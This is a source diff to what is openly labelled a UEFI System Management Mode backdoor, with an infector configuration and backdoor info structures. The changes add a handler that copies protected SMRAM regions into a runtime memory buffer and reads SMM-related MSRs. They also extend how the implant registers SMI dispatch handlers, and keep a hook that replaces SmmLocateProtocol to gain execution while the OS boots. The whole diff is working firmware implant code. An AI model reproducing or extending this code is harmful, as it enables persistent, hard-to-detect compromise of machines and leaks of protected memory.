@@ -1,4 +1,3 @@
-#include <intrin.h>
 #include <FrameworkSmm.h>
 
 #include <Protocol/LoadedImage.h>
@@ -7,6 +6,7 @@
 #include <Protocol/SmmAccess2.h>
 #include <Protocol/SmmSwDispatch2.h>
 #include <Protocol/SmmPeriodicTimerDispatch2.h>
+#include <Protocol/SmmEndOfDxe.h>
 #include <Protocol/DevicePath.h>
 #include <Protocol/SerialIo.h>
 
@@ -64,6 +64,8 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
 // MSR registers
 #define IA32_KERNEL_GS_BASE 0xC0000102
 #define IA32_EFER 0xC0000080
+#define MSR_SMM_MCA_CAP 0x17D
+#define MSR_SMM_FEATURE_CONTROL 0x4E0
 
 // IA32_EFER.LME flag
 #define IA32_EFER_LME 0x100                              
@@ -71,6 +73,8 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
 // CR* registers bits
 #define CR0_PG  0x80000000
 #define CR4_PAE 0x20
+
+#define MAX_SMRAM_SIZE (0x800000 * 2)
 
 EFI_SYSTEM_TABLE *gST;
 EFI_BOOT_SERVICES *gBS;
@@ -491,6 +495,7 @@ BOOLEAN BackdoorInfoInit(VOID)
 {
     EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;
     PBACKDOOR_INFO pBackdoorInfo = NULL;
+    UINTN PagesCount = 1 + (MAX_SMRAM_SIZE / PAGE_SIZE);
 
     if ((pBackdoorInfo = BackdoorInfoGet()) == NULL)
     {
@@ -500,7 +505,7 @@ BOOLEAN BackdoorInfoInit(VOID)
         EFI_STATUS Status = gBS->AllocatePages(
             AllocateAnyPages,
             EfiRuntimeServicesData,
-            2, &PagesAddr
+            PagesCount, &PagesAddr
         );
         if (EFI_ERROR(Status)) 
         {     
@@ -509,7 +514,7 @@ BOOLEAN BackdoorInfoInit(VOID)
         }        
 
         pBackdoorInfo = (PBACKDOOR_INFO)PagesAddr;        
-        gBS->SetMem(pBackdoorInfo, PAGE_SIZE * 2, 0);
+        gBS->SetMem(pBackdoorInfo, PagesCount * PAGE_SIZE, 0);
 
         DbgMsg(__FILE__, __LINE__, "Backdoor info is at "FPTR"\r\n", pBackdoorInfo);
 
@@ -1301,6 +1306,59 @@ EFI_STATUS EFIAPI SwDispatch2ProtocolNotifyHandler(
     return EFI_SUCCESS;   
 }
 //--------------------------------------------------------------------------------------
+EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
+    CONST EFI_GUID *Protocol, 
+    VOID *Interface, 
+    EFI_HANDLE Handle)
+{        
+    DbgMsg(__FILE__, __LINE__, "End of DXE phase\n");
+
+    if (g_BackdoorInfo)
+    {
+        UINTN Offset = 0, i = 0;
+        PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE); 
+
+        // enumerate available SMRAM regions
+        for (;;)
+        {
+            EFI_SMRAM_DESCRIPTOR *Info = &g_BackdoorInfo->SmramMap[i];
+
+            if (Info->PhysicalStart == 0 || Info->PhysicalSize == 0)
+            {
+                // end of the list
+                break;
+            }
+
+            if (Offset + Info->PhysicalSize <= MAX_SMRAM_SIZE)
+            {
+                // copy SMRAM region into the backdoor info structure
+                gBS->CopyMem(Buff + Offset, (VOID *)Info->PhysicalStart, Info->PhysicalSize);
+            }
+            else
+            {
+                break;
+            }
+
+            Offset += Info->PhysicalSize;
+            i += 1;
+        }
+
+#ifdef USE_MSR_SMM_MCA_CAP
+
+        // read MSR_SMM_MCA_CAP and MSR_SMM_FEATURE_CONTROL registers
+        g_BackdoorInfo->SmmMcaCap = __readmsr(MSR_SMM_MCA_CAP);
+        g_BackdoorInfo->SmmFeatureControl = __readmsr(MSR_SMM_FEATURE_CONTROL);
+
+#endif
+
+        g_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;
+    }    
+
+    return EFI_SUCCESS;   
+}
+//--------------------------------------------------------------------------------------
+#ifdef USE_PERIODIC_TIMER
+
 #define AMI_USB_SMM_PROTOCOL_GUID { 0x3ef7500e, 0xcf55, 0x474f, \
                                     { 0x8e, 0x7e, 0x00, 0x9e, 0x0e, 0xac, 0xec, 0xd2 }}
 
@@ -1339,6 +1397,8 @@ EFI_STATUS EFIAPI new_SmmLocateProtocol(
     return old_SmmLocateProtocol(Protocol, Registration, Interface);
 }
 
+#endif // USE_PERIODIC_TIMER
+
 EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, PVOID *Registration)
 {
     EFI_STATUS Status = gSmst->SmmRegisterProtocolNotify(Guid, Handler, Registration);
@@ -1357,15 +1417,53 @@ EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, 
 VOID BackdoorEntrySmm(VOID)
 {
     PVOID Registration = NULL;
+    EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *PeriodicTimerDispatch = NULL;
+    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;
 
     #define REGISTER_NOTIFY(_name_)                                 \
                                                                     \
         RegisterProtocolNotifySmm(&gEfiSmm##_name_##ProtocolGuid,   \
             _name_##ProtocolNotifyHandler, &Registration)
 
-    // set registration notifications for required SMM protocols
-    REGISTER_NOTIFY(PeriodicTimerDispatch2);
-    REGISTER_NOTIFY(SwDispatch2);
+    EFI_STATUS Status = gSmst->SmmLocateProtocol(
+        &gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, 
+        &PeriodicTimerDispatch
+    );
+    if (Status == EFI_SUCCESS)
+    {
+        // protocol is already present, call handler directly
+        PeriodicTimerDispatch2ProtocolNotifyHandler(
+            &gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
+            PeriodicTimerDispatch, NULL
+        );
+    }
+    else
+    {
+        // set registration notifications for required SMM protocol
+        REGISTER_NOTIFY(PeriodicTimerDispatch2);    
+    }
+
+    Status = gSmst->SmmLocateProtocol(
+        &gEfiSmmSwDispatch2ProtocolGuid, NULL, 
+        &SwDispatch
+    );
+    if (Status == EFI_SUCCESS)
+    {
+        // protocol is already present, call handler directly
+        SwDispatch2ProtocolNotifyHandler(
+            &gEfiSmmSwDispatch2ProtocolGuid,
+            SwDispatch, NULL
+        );
+    }
+    else
+    {
+        // set registration notifications for required SMM protocol
+        REGISTER_NOTIFY(SwDispatch2);    
+    }
+
+    REGISTER_NOTIFY(EndOfDxe);
+
+#ifdef USE_PERIODIC_TIMER
 
     DbgMsg(
         __FILE__, __LINE__, "Hooking SmmLocateProtocol(): "FPTR" -> "FPTR"\r\n",
@@ -1375,6 +1473,9 @@ VOID BackdoorEntrySmm(VOID)
     // hook SmmLocateProtocol() SMST function to get execution during OS boot phase
     old_SmmLocateProtocol = gSmst->SmmLocateProtocol;
     gSmst->SmmLocateProtocol = new_SmmLocateProtocol;
+
+#endif // USE_PERIODIC_TIMER
+
 }
 //--------------------------------------------------------------------------------------
 EFI_STATUS
@@ -1497,12 +1598,13 @@ BackdoorEntry(
                 {
                     UINTN SmramMapSize = PAGE_SIZE - sizeof(BACKDOOR_INFO);
 
+                    // get SMRAM information
                     Status = SmmAccess->GetCapabilities(
                         SmmAccess,
                         &SmramMapSize,
                         g_BackdoorInfo->SmramMap
                     );
-                    if (EFI_ERROR(Status)) 
+                    if (Status != EFI_SUCCESS)
                     {
                         DbgMsg(__FILE__, __LINE__, "GetCapabilities() fails: 0x%X\r\n", Status);
                     }
